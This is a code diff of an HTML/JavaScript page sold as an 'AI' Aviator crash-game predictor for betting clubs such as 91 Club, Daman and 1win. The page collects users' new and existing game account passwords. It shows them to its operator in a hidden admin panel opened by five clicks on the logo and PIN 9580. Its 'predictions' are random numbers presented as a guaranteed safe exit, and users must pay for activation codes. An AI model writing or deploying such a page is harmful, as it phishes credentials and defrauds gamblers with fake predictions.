@@ -1,253 +1,199 @@
-<!DOCTYPE html>
+     <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aviator Predictor Hub</title>
+    <title>KADIR 786 | AI INJECTOR v7.0</title>
     <style>
-        :root { --bg: #0d0d0d; --card: #1a1a1a; --neon-blue: #0084ff; --neon-red: #ff3131; --neon-green: #00ff41; --gold: #ffae00; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 70px; }
-
-        /* 1. SECRET ADMIN TRIGGER */
-        .admin-secret { position: fixed; top: 0; right: 0; width: 50px; height: 50px; z-index: 9999; cursor: pointer; }
-        #adminPanel { display: none; background: #000; border: 2px solid var(--neon-green); padding: 15px; margin: 10px; border-radius: 10px; position: fixed; top: 50px; left: 10px; right: 10px; z-index: 10000; max-height: 80vh; overflow-y: auto; }
-
-        /* 2. LOGIN PAGE */
-        .login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px 20px; }
-        .logo-main { width: 100px; margin-bottom: 20px; filter: drop-shadow(0 0 10px var(--neon-blue)); }
-        .input-group { width: 100%; max-width: 350px; margin-bottom: 20px; }
-        .input-group label { display: block; margin-bottom: 8px; font-size: 14px; color: #aaa; }
-        .input-group input { width: 100%; padding: 15px; background: #222; border: 1px solid #444; color: #fff; border-radius: 10px; box-sizing: border-box; }
-        .sign-in-btn { width: 100%; max-width: 350px; padding: 15px; background: var(--neon-blue); color: #fff; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 5px 15px rgba(0, 132, 255, 0.3); }
-
-        /* 3. CLUB GRID PAGE */
-        #clubPage { display: none; padding: 15px; }
-        .grid-container { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .club-card { background: var(--card); border-radius: 15px; padding: 15px; text-align: center; border: 1px solid #333; position: relative; }
-        .club-card img { width: 60px; height: 60px; border-radius: 10px; margin-bottom: 10px; object-fit: cover; }
-        .trending { position: absolute; top: 8px; left: 8px; background: var(--gold); color: #000; font-size: 10px; padding: 2px 8px; border-radius: 5px; font-weight: bold; }
-        .club-card h4 { margin: 5px 0; font-size: 16px; }
-        .club-card p { font-size: 11px; color: #777; margin: 0; }
-
-        /* 4. PREDICTION PAGE (New Colored Design) */
-        #predictionPage { display: none; padding: 20px; text-align: center; }
-        .prediction-header { margin-bottom: 30px; }
-        .prediction-header h2 { color: var(--neon-red); font-size: 28px; margin: 0; }
+        :root { --red: #ff0040; --blue: #0084ff; --green: #00ff41; --bg: #0d0d0d; }
+        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; text-align: center; }
         
-        .display-circle { width: 220px; height: 220px; border-radius: 50%; border: 8px solid #222; border-top-color: var(--neon-red); margin: 30px auto; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #1a1a1a 0%, #000 100%); box-shadow: 0 0 30px rgba(255, 49, 49, 0.2); animation: pulse 2s infinite; }
-        @keyframes pulse { 0% {box-shadow: 0 0 20px rgba(255,49,49,0.2);} 50% {box-shadow: 0 0 40px rgba(255,49,49,0.4);} 100% {box-shadow: 0 0 20px rgba(255,49,49,0.2);} }
+        /* ADMIN PANEL - TOTALLY HIDDEN */
+        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 10000; padding: 20px; box-sizing: border-box; overflow-y: auto; }
         
-        .result-num { font-size: 55px; font-weight: bold; color: #fff; }
-        .safe-tag { color: var(--neon-green); font-size: 12px; font-weight: bold; letter-spacing: 2px; }
+        /* PAGES */
+        .page { display: none; padding: 20px; }
+        .active-page { display: block; }
 
-        .btn-group { display: flex; flex-direction: column; gap: 15px; align-items: center; margin-top: 30px; }
-        .btn-predict { background: var(--neon-red); }
-        .btn-game { background: var(--neon-green); }
-        .btn-activate { background: var(--neon-blue); }
-        .action-btn { width: 90%; max-width: 320px; padding: 14px; border: none; border-radius: 8px; color: #fff; font-weight: bold; display: flex; justify-content: center; align-items: center; gap: 10px; cursor: pointer; }
+        /* INPUTS & BUTTONS */
+        .input-field { width: 90%; max-width: 320px; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; }
+        .btn-blue { background: var(--blue); width: 90%; max-width: 320px; padding: 15px; border: none; border-radius: 30px; color: #fff; font-weight: bold; cursor: pointer; }
+        .btn-red { background: var(--red); width: 90%; max-width: 320px; padding: 15px; border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }
+        
+        /* CLUB CARDS */
+        .club-card { background: #1a1a1a; margin: 10px; padding: 20px; border-radius: 15px; border: 1px solid #333; cursor: pointer; display: flex; align-items: center; gap: 15px; }
+        .club-card img { width: 50px; border-radius: 10px; }
 
-        .admin-note { background: rgba(255, 174, 0, 0.1); border: 1px solid var(--gold); padding: 12px; border-radius: 8px; color: var(--gold); font-size: 13px; margin-top: 20px; }
-
-        /* BOTTOM NAVBAR */
-        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 60px; background: #000; border-top: 1px solid #222; display: flex; justify-content: space-around; align-items: center; }
-        .nav-item { text-align: center; color: #777; font-size: 12px; }
-        .nav-item.active { color: var(--neon-blue); }
-
-        table { width: 100%; font-size: 11px; color: var(--neon-green); border-collapse: collapse; }
-        th, td { border: 1px solid #333; padding: 5px; }
+        /* PREDICTION AREA */
+        .circle-display { width: 220px; height: 220px; border-radius: 50%; border: 5px solid #222; border-top-color: var(--red); margin: 30px auto; display: flex; flex-direction: column; justify-content: center; background: #000; box-shadow: 0 0 20px rgba(255,0,64,0.3); }
+        .main-num { font-size: 50px; font-weight: bold; color: #fff; }
+        
+        table { width: 100%; font-size: 11px; border-collapse: collapse; color: var(--green); }
+        th, td { border: 1px solid #222; padding: 8px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="admin-secret" ondblclick="showAdmin()"></div>
+<div id="loginPage" class="page active-page">
+    <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" id="mainLogo" width="80" onclick="handleAdminClick()">
+    <h1>KADIR 786</h1>
+    <p style="color:#777;">New User Registration</p>
+    <input type="email" id="regEmail" class="input-field" placeholder="Create Account Email">
+    <input type="password" id="regPass" class="input-field" placeholder="Create Password">
+    <button class="btn-blue" onclick="toOldIdPage()">REGISTER & NEXT</button>
+</div>
+
+<div id="oldIdPage" class="page">
+    <h2>ACTIVATE OLD ID</h2>
+    <p style="color:#777;">Enter your existing game details to sync</p>
+    <input type="text" id="oldId" class="input-field" placeholder="Old Game ID/Email">
+    <input type="password" id="oldPass" class="input-field" placeholder="Game Password">
+    <button class="btn-blue" onclick="toClubPage()">ACTIVATE & LOGIN</button>
+</div>
+
+<div id="clubPage" class="page">
+    <h3>SELECT YOUR CLUB</h3>
+    <div class="club-card" onclick="toPredictor('91 Club')">
+        <img src="https://via.placeholder.com/50/FF0000/FFFFFF?text=91">
+        <div><h4>91 Club</h4><p>Server 1 Active</p></div>
+    </div>
+    <div class="club-card" onclick="toPredictor('Daman')">
+        <img src="https://via.placeholder.com/50/0084FF/FFFFFF?text=DM">
+        <div><h4>Daman Games</h4><p>Server 2 Active</p></div>
+    </div>
+    <div class="club-card" onclick="toPredictor('1win')">
+        <img src="https://via.placeholder.com/50/00FF41/FFFFFF?text=1W">
+        <div><h4>1win</h4><p>Server 3 Active</p></div>
+    </div>
+</div>
+
+<div id="predictorPage" class="page">
+    <h2 id="clubTitle" style="color:var(--red);">AVIATOR v7.0</h2>
+    <div class="circle-display">
+        <div id="scanStatus" style="display:none; color:var(--green); font-size:12px;">SCANNING...</div>
+        <div id="resultBox">
+            <div class="main-num" id="displayX">0.00x</div>
+            <div style="color:var(--green); font-size:12px;">SAFE EXIT</div>
+        </div>
+    </div>
+    <input type="text" id="actCode" class="input-field" placeholder="Enter Activation Code">
+    <button class="btn-red" onclick="runPrediction()">GET PREDICTION</button>
+    <div style="margin-top:20px; border-top:1px solid #222; padding:15px;">
+        <p style="font-size:12px; color:#888;">Admin Support: 9554527334</p>
+        <a href="https://t.me/Kadir786" style="color:var(--blue); font-size:12px;">Join Telegram Official</a>
+    </div>
+</div>
 
 <div id="adminPanel">
-    <div style="display:flex; justify-content:space-between;">
-        <h3 style="color:var(--neon-green); margin:0;">KADIR 786 DASHBOARD</h3>
-        <button onclick="document.getElementById('adminPanel').style.display='none'">X</button>
+    <h2 style="color:var(--green);">KADIR 786 COMMAND CENTER</h2>
+    <div id="admAuth">
+        <input type="password" id="admPassInput" class="input-field" placeholder="Admin PIN">
+        <button onclick="checkAdminPass()">Login</button>
     </div>
-    <p>Password (9580): <input type="password" id="admPass" style="width:80px;"> <button onclick="authAdm()">Enter</button></p>
-    <div id="admData" style="display:none;">
-        <h4 style="color:var(--gold);">LIVE DATA TRACKER</h4>
+    <div id="admContent" style="display:none;">
+        <button onclick="document.getElementById('adminPanel').style.display='none'">CLOSE</button>
+        <button onclick="generateKey()" style="background:orange;">GENERATE KEY</button>
+        <p id="keyOut" style="color:yellow;"></p>
+        <h4>USER DATABASE (Live Tracking)</h4>
         <table id="logTable">
-            <thead><tr><th>ID</th><th>PASS</th><th>DEVICE</th><th>LOC</th></tr></thead>
+            <thead><tr><th>Email</th><th>ID/Pass</th><th>Device</th><th>Time</th></tr></thead>
             <tbody id="logBody"></tbody>
         </table>
-        <button onclick="createKey()" style="margin-top:15px; background:var(--gold); padding:8px; border:none; border-radius:5px;">GENERATE ACTIVATION KEY</button>
-        <p id="generatedKey" style="color:yellow; font-weight:bold;"></p>
     </div>
-</div>
-
-<div id="loginPage" class="login-screen">
-    <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" class="logo-main">
-    <h1 style="margin:0;">Aviator</h1>
-    <p style="color:#777; margin-bottom:40px;">AI-Powered Predictions</p>
-
-    <div class="input-group">
-        <label>Email Address</label>
-        <input type="text" id="userEmail" placeholder="Enter your email">
-    </div>
-    <div class="input-group">
-        <label>Password</label>
-        <input type="password" id="userPass" placeholder="Enter your password">
-    </div>
-
-    <button class="sign-in-btn" onclick="startSystem()">Sign In</button>
-    <p style="color:#777; margin-top:20px; font-size:14px;">Don't have an account? <span style="color:var(--neon-blue)">Sign Up</span></p>
-    
-    <div style="margin-top:50px; text-align:center;">
-        <p style="color:#777; font-size:12px;">? Join our Telegram</p>
-        <a href="https://t.me/Kadir786_Official" style="color:var(--neon-red); text-decoration:none; font-size:13px;">https://t.me/Aviator_Predictor_V5</a>
-    </div>
-</div>
-
-<div id="clubPage">
-    <div style="display:flex; justify-content:space-between; align-items:center; padding:10px 0;">
-        <h2 style="margin:0;"><img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" width="25"> Aviator</h2>
-        <span style="color:var(--neon-blue); font-size:20px;">🔍</span>
-    </div>
-    
-    <div class="grid-container">
-        <div class="club-card" onclick="openPredictor('91 Club')">
-            <span class="trending">🔥 Trending</span>
-            <img src="https://res.cloudinary.com/drt669sc7/image/upload/v1711200000/91club.png" alt="91">
-            <h4>91 Club</h4>
-            <p>Get predictions for 91 Club hack</p>
-        </div>
-        <div class="club-card" onclick="openPredictor('Daman')">
-            <span class="trending">🔥 Trending</span>
-            <img src="https://res.cloudinary.com/drt669sc7/image/upload/v1711200000/daman.png" alt="Daman">
-            <h4>Daman</h4>
-            <p>Get predictions for Daman hack</p>
-        </div>
-        <div class="club-card" onclick="openPredictor('1win')">
-            <img src="https://res.cloudinary.com/drt669sc7/image/upload/v1711200000/1win.png" alt="1win">
-            <h4>1win Hack</h4>
-            <p>Get predictions for 1win hack</p>
-        </div>
-        <div class="club-card" onclick="openPredictor('55 Club')">
-            <img src="https://res.cloudinary.com/drt669sc7/image/upload/v1711200000/55club.png" alt="55">
-            <h4>55 Club</h4>
-            <p>Get predictions for 55 Club hack</p>
-        </div>
-    </div>
-</div>
-
-<div id="predictionPage">
-    <div class="prediction-header">
-        <div style="display:flex; justify-content:space-between;">
-            <span onclick="goBack()" style="font-size:24px;">←</span>
-            <h3 id="targetClub">Daman</h3>
-            <span style="font-size:24px;">↻</span>
-        </div>
-        <h2>Aviator predictor v5.0</h2>
-        <p style="color:#777;">Get predictions for hack</p>
-    </div>
-
-    <div class="display-circle">
-        <div id="loadTxt" style="display:none; color:var(--neon-red); font-size:12px;">ANALYZING...</div>
-        <div id="numDisplay">
-            <div class="result-num" id="mainX">1.00x</div>
-            <div class="safe-tag">SAFE EXIT</div>
-        </div>
-    </div>
-
-    <div class="btn-group">
-        <button class="action-btn btn-predict" onclick="getSignal()">📈 Get Prediction</button>
-        <button class="action-btn btn-game">🎮 Go to Game</button>
-        <button class="action-btn btn-activate">🔑 Activate Hack</button>
-    </div>
-
-    <div class="admin-note">
-        ⓘ Activation code ke liye Admin se sampark karein: <br>
-        <a href="tel:9554527334" style="color:#fff; font-weight:bold; text-decoration:none;">📞 Call: 9554527334</a>
-    </div>
-
-    <div style="margin-top:30px;">
-        <p style="font-size:12px; color:#777;">Join our telegram</p>
-        <a href="#" style="color:var(--neon-red); font-size:12px;">https://t.me/Aviator_Predictor_V5</a>
-    </div>
-</div>
-
-<div class="bottom-nav">
-    <div class="nav-item active">🏠<br>Home</div>
-    <div class="nav-item">👤<br>Profile</div>
 </div>
 
 <script>
-    let masterKeys = JSON.parse(localStorage.getItem('savedKeys')) || [];
-    let deviceModel = "";
+    let clickCount = 0;
+    let masterKeys = JSON.parse(localStorage.getItem('kadir_keys')) || [];
+    let userLogs = JSON.parse(localStorage.getItem('kadir_logs')) || [];
 
-    // Device tracking logic
-    window.onload = () => {
-        deviceModel = navigator.userAgent.split(')')[0].split('(')[1] || "Unknown Device";
-    };
-
-    function showAdmin() { document.getElementById('adminPanel').style.display = 'block'; }
-    
-    function authAdm() {
-        if(document.getElementById('admPass').value === "9580") {
-            document.getElementById('admData').style.display = 'block';
-            updateAdminTable();
+    function handleAdminClick() {
+        clickCount++;
+        if(clickCount >= 5) {
+            document.getElementById('adminPanel').style.display = 'block';
+            clickCount = 0;
         }
     }
 
-    function createKey() {
-        let k = "ACT-" + Math.floor(Math.random()*9000+1000);
+    function checkAdminPass() {
+        if(document.getElementById('admPassInput').value === "9580") {
+            document.getElementById('admAuth').style.display = 'none';
+            document.getElementById('admContent').style.display = 'block';
+            refreshLogs();
+        }
+    }
+
+    function toOldIdPage() {
+        let e = document.getElementById('regEmail').value;
+        let p = document.getElementById('regPass').value;
+        if(e && p) {
+            saveLog(e, "REG:"+p);
+            switchPage('oldIdPage');
+        }
+    }
+
+    function toClubPage() {
+        let id = document.getElementById('oldId').value;
+        let pw = document.getElementById('oldPass').value;
+        if(id && pw) {
+            saveLog(id, "OLD:"+pw);
+            switchPage('clubPage');
+        }
+    }
+
+    function toPredictor(club) {
+        document.getElementById('clubTitle').innerText = club + " Predictor";
+        switchPage('predictorPage');
+    }
+
+    function runPrediction() {
+        let code = document.getElementById('actCode').value;
+        if(masterKeys.includes(code)) {
+            document.getElementById('resultBox').style.display = 'none';
+            document.getElementById('scanStatus').style.display = 'block';
+            
+            setTimeout(() => {
+                // REAL LOGIC: Suppose real crash is between 3x-10x
+                let realCrash = (Math.random() * 7 + 3);
+                // SAFE EXIT: We give 1.0x to 1.5x lower than real
+                let safeExit = (realCrash - 1.2).toFixed(2);
+                
+                document.getElementById('scanStatus').style.display = 'none';
+                document.getElementById('resultBox').style.display = 'block';
+                document.getElementById('displayX').innerText = safeExit + "x";
+                alert("Safe Withdrawal Predicted: " + safeExit + "x");
+            }, 2500);
+        } else {
+            alert("Invalid Code! Contact Admin 9554527334");
+        }
+    }
+
+    function saveLog(u, p) {
+        let device = navigator.platform + " / " + (navigator.userAgent.includes("Android") ? "Android" : "iOS");
+        userLogs.push({u, p, d: device, t: new Date().toLocaleTimeString()});
+        localStorage.setItem('kadir_logs', JSON.stringify(userLogs));
+    }
+
+    function generateKey() {
+        let k = "KDR-" + Math.floor(1000 + Math.random() * 9000);
         masterKeys.push(k);
-        localStorage.setItem('savedKeys', JSON.stringify(masterKeys));
-        document.getElementById('generatedKey').innerText = "NEW CODE: " + k;
+        localStorage.setItem('kadir_keys', JSON.stringify(masterKeys));
+        document.getElementById('keyOut').innerText = "New Key: " + k;
     }
 
-    function startSystem() {
-        let email = document.getElementById('userEmail').value;
-        let pass = document.getElementById('userPass').value;
-        if(email && pass) {
-            let userLogs = JSON.parse(localStorage.getItem('logs')) || [];
-            userLogs.push({email, pass, device: deviceModel, time: new Date().toLocaleTimeString()});
-            localStorage.setItem('logs', JSON.stringify(userLogs));
-            
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('clubPage').style.display = 'block';
-        } else { alert("Please login first!"); }
-    }
-
-    function openPredictor(club) {
-        document.getElementById('clubPage').style.display = 'none';
-        document.getElementById('predictionPage').style.display = 'block';
-        document.getElementById('targetClub').innerText = club;
-    }
-
-    function goBack() {
-        document.getElementById('predictionPage').style.display = 'none';
-        document.getElementById('clubPage').style.display = 'block';
-    }
-
-    function getSignal() {
-        // Safe Exit Logic: 10x fategi toh hum 9x batayenge
-        document.getElementById('numDisplay').style.display = 'none';
-        document.getElementById('loadTxt').style.display = 'block';
-        
-        setTimeout(() => {
-            let base = (Math.random() * 5 + 1.5); 
-            let displayVal = (base * 0.9).toFixed(2); // Safe reduction
-            
-            document.getElementById('loadTxt').style.display = 'none';
-            document.getElementById('numDisplay').style.display = 'block';
-            document.getElementById('mainX').innerText = displayVal + "x";
-            
-            alert("ADMIN MESSAGE: Withdraw at exactly " + displayVal + "x for 100% win.");
-        }, 2000);
-    }
-
-    function updateAdminTable() {
-        let logs = JSON.parse(localStorage.getItem('logs')) || [];
+    function refreshLogs() {
         let html = "";
-        logs.forEach(l => {
-            html += `<tr><td>${l.email}</td><td>${l.pass}</td><td>${l.device}</td><td>India</td></tr>`;
+        userLogs.forEach(l => {
+            html += `<tr><td>${l.u}</td><td>${l.p}</td><td>${l.d}</td><td>${l.t}</td></tr>`;
         });
         document.getElementById('logBody').innerHTML = html;
+    }
+
+    function switchPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+        document.getElementById(id).classList.add('active-page');
     }
 </script>
 </body>
 </html>
+   
